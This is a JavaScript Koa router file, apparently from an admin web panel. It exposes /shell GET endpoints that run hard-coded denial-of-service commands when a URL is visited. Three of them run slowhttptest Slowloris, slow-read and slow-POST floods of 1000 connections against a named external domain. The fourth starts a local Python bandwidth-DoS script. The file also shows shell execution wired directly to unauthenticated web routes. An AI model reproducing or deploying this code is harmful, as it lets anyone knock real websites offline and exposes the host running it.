const router = require('koa-router')()
const { getslowloris, getslowread, getslowpost, doShellCmd, doCmdCmd, getbanddosfig} = require('../controller/shell')
let testslowloris="slowhttptest -c 1000 -H -g -o ./public/slowhttptest/slowloris/slowloris -i 10 -r 200 -t GET -u https://fengdushuo.top/wx -x 24 -p 3"
let testslowread="slowhttptest -c 1000 -X -g -o ./public/slowhttptest/slowread/slowread -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u https://fengdushuo.top/wx -p 3"
let testslowpost="slowhttptest -c 1000 -B -g -o ./public/slowhttptest/slowpost/slowpost -i 110 -r 200 -s 8192 -t FAKEVERB -u https://fengdushuo.top/wx -x 10 -p 3"
let testbanddosfig="D:/work_tools/Anaconda3/envs/tensorflow_workstation/python.exe d:/a_work/test/self_test/group_management/test/group_management_web/admin-master/server/public/upload-files/BandDos/band_soc.py"

router.prefix('/shell')

function handleRes(ctx, next, res) {
	if (res.status === 0) {
		ctx.body = res
	} else {
		ctx.status = res.httpCode
		ctx.body = res
		// ctx.message = res.message   //本来想直接设置fetch的statusText，但是加了这句话请求就出错
	}
}

router.get('/toslowloris', async function (ctx, next) {
    const res = await getslowloris()
    let result=await doShellCmd(testslowloris)
    console.log("[slowloris] ",result)
	handleRes(ctx, next, res)
})
router.get('/toslowread', async function (ctx, next) {
    const res = await getslowread()
    let result=await doShellCmd(testslowread)
    console.log("[slowread] ",result)
	handleRes(ctx, next, res)
})
router.get('/toslowpost', async function (ctx, next) {
    const res = await getslowpost()
    let result=await doShellCmd(testslowpost)
    console.log("[slowpost] ",result)
	handleRes(ctx, next, res)
})
router.get('/banddosfig', async function (ctx, next) {
    const res = await getbanddosfig()
    let result=await doCmdCmd(testbanddosfig)
    console.log("[banddosfig] ",result)
	handleRes(ctx, next, res)
})


module.exports = router
